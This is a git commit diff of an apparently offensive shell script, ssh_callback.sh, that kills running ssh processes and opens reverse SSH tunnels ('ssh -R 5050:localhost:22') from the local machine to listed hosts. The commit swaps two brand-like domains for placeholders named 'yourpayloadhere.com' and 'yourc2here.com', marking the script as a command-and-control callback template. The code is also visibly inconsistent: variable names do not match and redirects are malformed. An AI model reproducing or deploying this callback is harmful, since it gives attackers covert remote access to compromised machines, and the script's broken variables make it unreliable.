17d0fcd8672b3eee5a381537b0cc4762debb34fb
Sean Pierce <root@securesean.com>
2018-12-19 22:30:05 -0600

    Update ssh_callback.sh

--- callback-server-ssh/ssh_callback.sh
+++ callback-server-ssh/ssh_callback.sh
@@ -3,7 +3,7 @@ killall ssh >/dev/null 2>$1
 sleep 5
 REMLIS=5050
 REUSR=callbackuser
-HOSTS="natgeoanswers.com target-rebates.com"
+HOSTS="yourpayloadhere.com yourc2here.com"
 for host in $HOSTS;
 do 
  ssh -R ${REMLIS}:localhost:22 -i "/home/i{$REMUSR}/.ssh/id_rsa" -N ${HOST} -l ${REMUSR};
